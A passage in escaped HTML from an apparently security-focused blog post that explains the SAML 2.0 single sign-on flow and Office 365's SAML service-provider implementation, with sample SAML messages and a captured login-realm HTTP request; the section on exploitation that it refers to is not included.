     &lt;span class="nt"&gt;&amp;lt;/saml:SubjectConfirmation&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/saml:Subject&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml:Conditions&lt;/span&gt; &lt;span class="na"&gt;NotBefore=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-14T11:40:48Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;NotOnOrAfter=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-14T11:50:48Z&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;saml:AudienceRestriction&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml:Audience&amp;gt;&lt;/span&gt;https://myserviceprovider.atsomeorg.com/shibboleth&lt;span class="nt"&gt;&amp;lt;/saml:Audience&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;/saml:AudienceRestriction&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/saml:Conditions&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml:AuthnStatement&lt;/span&gt; &lt;span class="na"&gt;AuthnInstant=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-14T11:40:48Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;SessionNotOnOrAfter=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-14T11:50:48Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;SessionIndex=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_be9967abd904ddcae3c0eb4189adbe3f71e327cf93&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;saml:AuthnContext&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml:AuthnContextClassRef&amp;gt;&lt;/span&gt;urn:oasis:names:tc:SAML:2.0:ac:classes:Password&lt;span class="nt"&gt;&amp;lt;/saml:AuthnContextClassRef&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;/saml:AuthnContext&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/saml:AuthnStatement&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml:AttributeStatement&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;saml:Attribute&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;uid&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;NameFormat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml:AttributeValue&lt;/span&gt; &lt;span class="na"&gt;xsi:type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xs:string&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;test&lt;span class="nt"&gt;&amp;lt;/saml:AttributeValue&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;/saml:Attribute&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;saml:Attribute&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;mail&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;NameFormat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml:AttributeValue&lt;/span&gt; &lt;span class="na"&gt;xsi:type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xs:string&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;test&amp;#64;example.com&lt;span class="nt"&gt;&amp;lt;/saml:AttributeValue&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;/saml:Attribute&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;saml:Attribute&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;eduPersonAffiliation&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;NameFormat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml:AttributeValue&lt;/span&gt; &lt;span class="na"&gt;xsi:type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xs:string&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;users&lt;span class="nt"&gt;&amp;lt;/saml:AttributeValue&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml:AttributeValue&lt;/span&gt; &lt;span class="na"&gt;xsi:type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xs:string&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;examplerole1&lt;span class="nt"&gt;&amp;lt;/saml:AttributeValue&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;/saml:Attribute&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/saml:AttributeStatement&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;/saml:Assertion&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/samlp:Response&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;and instructs the user browser to make a HTTP POST request to - in this case - &lt;a class="reference external" href="https://myserviceprovider.atsomeorg.com/Shibboleth.sso/SAML2/POST"&gt;https://myserviceprovider.atsomeorg.com/Shibboleth.sso/SAML2/POST&lt;/a&gt;.&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;&lt;em&gt;InResponseTo&lt;/em&gt; contains the value that was sent as an ID in the SAML Request so that the Service Provider can match this to the request it sent. ( and to avoid replay attacks )&lt;/li&gt;
&lt;li&gt;&lt;em&gt;IssueIstant&lt;/em&gt;, &lt;em&gt;NotBefore&lt;/em&gt; and &lt;em&gt;NotOnOrAfter&lt;/em&gt; define a time interval for which the SAML Response ( and Assertion ) is valid, in order to protect against replay attacks.&lt;/li&gt;
&lt;li&gt;The Assertion contains in &lt;em&gt;Issuer&lt;/em&gt; field so that the Service Provider can verify that the Assertion comes from the Identity Provider it expects it to come from.&lt;/li&gt;
&lt;li&gt;The Assertion also contains an AudienceRestriction element that defines that this Assertion is targeted for a specific Service Provider and cannot be used for any other Service Provider.&lt;/li&gt;
&lt;li&gt;The Assertion contains a Subject element which identifies the authenticated principal(user)&lt;/li&gt;
&lt;li&gt;The AttributeStatement part of the Assertion contains attributes and their values for the specific user that comes as authenticated.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;The Assertion (and possibly the whole SAML Response) is signed with a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/XML_Signature"&gt;XML Signature&lt;/a&gt; that protects the integrity of the Assertion (or response) and verifies that it has not
been modified in transit.&lt;/p&gt;
&lt;p&gt;Upon receiving the SAML Response, the Service Provider can verify its contents and structure, validate the signature and subsequently treat the user as authenticated initiating a web session for them.&lt;/p&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;By now, you should have wondered about at least a couple of things:&lt;/dt&gt;
&lt;dd&gt;&lt;ol class="first last arabic simple"&gt;
&lt;li&gt;How does the Service Provider know and trust the Identity Provider?&lt;/li&gt;
&lt;li&gt;How does the Identity Provider know and trust the Service Provider?&lt;/li&gt;
&lt;li&gt;The Identity Provider signs that Assertion with what?&lt;/li&gt;
&lt;li&gt;How does the Service Provider verify the signature when it receives the Assertion?&lt;/li&gt;
&lt;/ol&gt;
&lt;/dd&gt;
&lt;dt&gt;What is purposely left out here for brevity is that the Identity Provider and the Service Provider need to bootstrap their trust somehow before all the above can happen. In order to do that, they need to exchange metadata. The metadata contain information like the certificate with the public key that corresponds to the private key that the Identity Provider uses to sign the Assertions, the URLs that correspond to each entity's bindings, the algorithms they support/request, etc. There are two ways for them to know each other's metadata&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Either the Identity Provider and the Service Provider bootstrap their trust relationship bilaterally by exchanging metadata in a secure manner.&lt;/li&gt;
&lt;li&gt;Or both delegate this trust to a 3rd party by joining a Federation. The Federation Operator then assumes the task to gather the metadata from all entities that participate, sign and publish the aggregates. Each Identity Provider and Service Provider then consumes that metadata in order to get information about the rest of the entities that participate in that Federation.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="how-office-365-saml-implementation-works"&gt;
&lt;h2&gt;How Office 365 SAML implementation works&lt;/h2&gt;
&lt;p&gt;The Office 365 service provider implementation is a weird mixture of WS-Trust specification and SAML 2.0 Web Browser SSO Profile. That is, Office 365 supports SSO both with WS-Trust and with SAML 2.0 Web Browser SSO but the two implementations are not isolated. This is why, for example, in the &lt;a class="reference external" href="https://msdn.microsoft.com/en-us/library/azure/jj205456.aspx"&gt;official documentation for SAML 2.0 SSO&lt;/a&gt; shibboleth identity provider is referred to as a &lt;em&gt;Security Token Service&lt;/em&gt;, terminology that is relevant to WS-Trust specification but not SAML.
The SAML service provider is, however, SAML 2.0 compliant-ish (sic) from the perspective of a SAML identity provider and uses a token translation service to convert SAML messages to WS-Trust messages internally. This encapsulation becomes specifically relevant later on, when discussing the attack surface in &lt;a class="reference internal" href="#how-could-this-be-exploited"&gt;How could this be exploited?&lt;/a&gt; as the vulnerability found in the SAML Service Provider implementation also affects the WS-Trust SSO implementation because of this token translation service.&lt;/p&gt;
&lt;p&gt;However, for the sake of simplicity, for the rest of this section the Office 365 service provider is considered to be a SAML service provider.&lt;/p&gt;
&lt;p&gt;One additional thing to keep in mind is that Office 365 does not support Just-In-Time provisioning for accounts authenticating via SAML, so for Signle Sign On to work the account must already be registered in Azure AD for the
specific tenant. This can happen via Directory Synchronization or via user provisioning with the help of an IDM system, but this is out of the scope of this post.&lt;/p&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;The attributes that are required to be released from an Identity Provider to the Office 365 Service Provider for the user are two:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;The UPN of the user expressed in an attribute with name IDPEmail&lt;/li&gt;
&lt;li&gt;An ImmutableId that is what uniquely identifies the user, expressed in the Subject of the SAML Assertion&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;The process starts with the user accessing &lt;a class="reference external" href="https://portal.office.com"&gt;Office 365 portal&lt;/a&gt;, being redirected to &lt;em&gt;https://login.microsoftonline.com/login.srf&lt;/em&gt; where he is greeted with the following form&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Office 365 portal login form" src="/images/office365-1.png" style="width: 80%;" /&gt;
&lt;p class="caption"&gt;Office 365 portal login form&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Upon entering the username and pressing TAB or clicking on the password field, the page makes an XHR to &lt;em&gt;https://login.microsoftonline.com/common/userrealm&lt;/em&gt; in order to check if the user's domain corresponds to an Office 365
tenant&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
GET /common/userrealm/?user=ikakavas&amp;#64;testdomain.gr&amp;amp;api-version=2.1&amp;amp;stsRequest=rQIIAbNSzigpKSi20tcvyC8qSczRy09Ly0xO1UvOz9XLL0rPTAGxioS4BMruuVuZ2Fh77Wj-e6KxLMF2FaMaTp36OYl5KZl56XqJxQUVFxgZu5hYDA2MjTcxsfo6-zp5nmCacFbuFpOgf1G6Z0p4sVtqSmpRYklmft4jJt7Q4tQi_7ycypD87NS8Scx8OfnpmXnxxUVp8Wk5-eVAAaDxBYnJJfElmcnZqSW7mFVSU00tTCxTUnRNkpOTdU2Sksx0kwxSzXRTzZMtTC1ME00Mk1MOsGwIucAi8IOFcREr0C-3A6ZLrn182Gt-tWV-vVlpwi5OW-L8Yl-SWJSeWmKrapSWkpqWWJpTAhYGAA2&amp;amp;checkForMicrosoftAccount=false HTTP/1.1
Host: login.microsoftonline.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: https://login.microsoftonline.com/login.srf?wa=wsignin1.0&amp;amp;rpsnv=4&amp;amp;ct=1460721662&amp;amp;rver=6.7.6640.0&amp;amp;wp=MCMBI&amp;amp;wreply=https%3a%2f%2fportal.office.com%2flanding.aspx%3ftarget%3d%252fdefault.aspx&amp;amp;lc=1033&amp;amp;id=501392&amp;amp;msafed=0&amp;amp;client-request-id=3a47de76-3c34-4a3b-b883-fdc88176603d
&lt;/pre&gt;
&lt;p&gt;If the domain is known and configured as federated, the user's browser is instructed to make an HTTP POST request to the HTTP-POST binding URL of the Identity Provider for that domain with a SAML Response in the body that looks like this:&lt;/p&gt;
&lt;pre class="code xml literal-block"&gt;
&lt;span class="nt"&gt;&amp;lt;samlp:AuthnRequest&lt;/span&gt; &lt;span class="na"&gt;xmlns:samlp=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:protocol&amp;quot;&lt;/span&gt;
                   &lt;span class="na"&gt;xmlns:saml=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:assertion&amp;quot;&lt;/span&gt;
                   &lt;span class="na"&gt;ID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_f6daef39-fb54-407e-abb4-c75d261b75ae&amp;quot;&lt;/span&gt;
                   &lt;span class="na"&gt;IssueInstant=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-11T21:13:44Z&amp;quot;&lt;/span&gt;
                   &lt;span class="na"&gt;Version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt;
                   &lt;span class="na"&gt;AssertionConsumerServiceIndex=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml:Issuer&amp;gt;&lt;/span&gt;urn:federation:MicrosoftOnline&lt;span class="nt"&gt;&amp;lt;/saml:Issuer&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;samlp:NameIDPolicy&lt;/span&gt; &lt;span class="na"&gt;Format=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:nameid-format:persistent&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/samlp:AuthnRequest&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The user is then prompted for authentication in the Identity Provider&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Idenity Provider login form" src="/images/office365-2.png" /&gt;
&lt;p class="caption"&gt;Idenity Provider login form&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;and subsequently their browser is instructed to make an HTTP POST back to the HTTP-POST binding URL of Office 365, &lt;em&gt;https://login.microsoftonline.com/login.srf&lt;/em&gt; with the SAML Response containing the Assertion in the request body. An example of this SAML Response is seen below&lt;/p&gt;
&lt;pre class="code xml literal-block"&gt;
&lt;span class="nt"&gt;&amp;lt;saml2p:Response&lt;/span&gt; &lt;span class="na"&gt;Destination=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://login.microsoftonline.com/login.srf&amp;quot;&lt;/span&gt;
                &lt;span class="na"&gt;ID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_cefc5f992f2e455d7b3e52522fc479db&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;InResponseTo=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_f6daef39-fb54-407e-abb4-c75d261b75ae&amp;quot;&lt;/span&gt;
                &lt;span class="na"&gt;IssueInstant=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-11T21:14:35.365Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:saml2p=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:protocol&amp;quot;&lt;/span&gt;
                &lt;span class="na"&gt;xmlns:xsd=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml2:Issuer&lt;/span&gt; &lt;span class="na"&gt;xmlns:saml2=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:assertion&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;https://idp.admin.grnet.gr/idp/shibboleth&lt;span class="nt"&gt;&amp;lt;/saml2:Issuer&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;ds:Signature&lt;/span&gt; &lt;span class="na"&gt;xmlns:ds=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;ds:SignedInfo&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;ds:CanonicalizationMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/10/xml-exc-c14n#&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;ds:SignatureMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;ds:Reference&lt;/span&gt; &lt;span class="na"&gt;URI=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#_cefc5f992f2e455d7b3e52522fc479db&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;ds:Transforms&amp;gt;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;lt;ds:Transform&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;lt;ds:Transform&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/10/xml-exc-c14n#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                       &lt;span class="nt"&gt;&amp;lt;ec:InclusiveNamespaces&lt;/span&gt; &lt;span class="na"&gt;PrefixList=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xsd&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:ec=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/10/xml-exc-c14n#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;lt;/ds:Transform&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;/ds:Transforms&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;ds:DigestMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#sha1&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;ds:DigestValue&amp;gt;&lt;/span&gt;dc1f3jn97lZ6FWdxGxsEWxXNsTM=&lt;span class="nt"&gt;&amp;lt;/ds:DigestValue&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;/ds:Reference&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/ds:SignedInfo&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;ds:SignatureValue&amp;gt;&lt;/span&gt;
       Removed for brevity
       &lt;span class="nt"&gt;&amp;lt;/ds:SignatureValue&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;ds:KeyInfo&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;ds:X509Data&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;ds:X509Certificate&amp;gt;&lt;/span&gt;
               Removed for brevity
               &lt;span class="nt"&gt;&amp;lt;/ds:X509Certificate&amp;gt;&lt;/span&gt;
          &lt;span class="nt"&gt;&amp;lt;/ds:X509Data&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/ds:KeyInfo&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/ds:Signature&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml2p:Status&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2p:StatusCode&lt;/span&gt; &lt;span class="na"&gt;Value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:status:Success&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/saml2p:Status&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml2:Assertion&lt;/span&gt; &lt;span class="na"&gt;ID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_b971f4e7f575bcc9cbc9034246c62c98&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;IssueInstant=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-11T21:14:35.365Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt;
                    &lt;span class="na"&gt;xmlns:saml2=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:assertion&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:xsd=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2:Issuer&amp;gt;&lt;/span&gt;https://idp.admin.grnet.gr/idp/shibboleth&lt;span class="nt"&gt;&amp;lt;/saml2:Issuer&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;ds:Signature&lt;/span&gt; &lt;span class="na"&gt;xmlns:ds=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;ds:SignedInfo&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;ds:CanonicalizationMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/10/xml-exc-c14n#&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;ds:SignatureMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;ds:Reference&lt;/span&gt; &lt;span class="na"&gt;URI=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#_b971f4e7f575bcc9cbc9034246c62c98&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;lt;ds:Transforms&amp;gt;&lt;/span&gt;
                       &lt;span class="nt"&gt;&amp;lt;ds:Transform&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                       &lt;span class="nt"&gt;&amp;lt;ds:Transform&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/10/xml-exc-c14n#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                           &lt;span class="nt"&gt;&amp;lt;ec:InclusiveNamespaces&lt;/span&gt; &lt;span class="na"&gt;PrefixList=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xsd&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:ec=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/10/xml-exc-c14n#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                       &lt;span class="nt"&gt;&amp;lt;/ds:Transform&amp;gt;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;lt;/ds:Transforms&amp;gt;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;lt;ds:DigestMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#sha1&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;lt;ds:DigestValue&amp;gt;&lt;/span&gt;WBgE+nW+3g9P5XpiZwGE06MT//g=&lt;span class="nt"&gt;&amp;lt;/ds:DigestValue&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;/ds:Reference&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;/ds:SignedInfo&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;ds:SignatureValue&amp;gt;&lt;/span&gt;
           Removed for brevity
           &lt;span class="nt"&gt;&amp;lt;/ds:SignatureValue&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;ds:KeyInfo&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;ds:X509Data&amp;gt;&lt;/span&gt;
                   &lt;span class="nt"&gt;&amp;lt;ds:X509Certificate&amp;gt;&lt;/span&gt;
                   Removed for brevity
                   &lt;span class="nt"&gt;&amp;lt;/ds:X509Certificate&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;/ds:X509Data&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;/ds:KeyInfo&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/ds:Signature&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2:Subject&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;saml2:NameID&lt;/span&gt; &lt;span class="na"&gt;Format=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:nameid-format:persistent&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;This is where my ImmutableId is&lt;span class="nt"&gt;&amp;lt;/saml2:NameID&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;saml2:SubjectConfirmation&lt;/span&gt; &lt;span class="na"&gt;Method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
